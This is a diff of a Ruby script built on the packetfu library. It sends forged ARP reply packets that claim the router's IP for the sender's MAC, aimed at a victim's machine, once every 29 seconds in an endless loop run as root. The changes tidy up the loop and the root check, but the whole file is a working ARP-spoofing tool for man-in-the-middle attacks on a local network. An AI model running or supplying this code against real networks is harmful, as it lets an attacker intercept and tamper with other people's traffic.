@@ -7,7 +7,7 @@ require 'packetfu'
 require 'socket'
 
 def poison(lip, lmac, vip, vmac, rip, int_name)
-   puts "Sending ARP Packet Spoof Every 30 Seconds…"
+   puts "Sending ARP Packet Spoof Every 29 Seconds…"
    x = PacketFu::ARPPacket.new(:flavor => "Linux")
      x.eth_saddr = lmac  # your MAC Address
      x.eth_daddr = vmac  # victim MAC Address
@@ -16,10 +16,9 @@ def poison(lip, lmac, vip, vmac, rip, int_name)
      x.arp_saddr_ip = rip # Router IP Address
      x.arp_daddr_ip=  vip # Victim IP Address
      x.arp_opcode = 2 # ARP Reply Code
-   sunny = false # Condition Set
-   while sunny==false do # Infinite Loop created
-     x.to_w(int_name) # Put Packet to wire – interface
-      sleep(29) # “Sleep” interval in seconds, change for your preference 
+   while true do # Infinite Loop created
+     x.to_w(int_name) # Put Packet to wire  interface
+      sleep(29) # interval in seconds, change for your preference 
    end
 end
 
@@ -40,10 +39,9 @@ end
 
 # need to be root to run this
 
-user = `id -u`
-if user.to_i != 0
-  puts "you need to run this script as root!!!"
-  exit()
+unless Process.uid.zero?
+  puts "you need to run this script as root!"
+  exit 0
 end
 
 #select interface to use and start setup
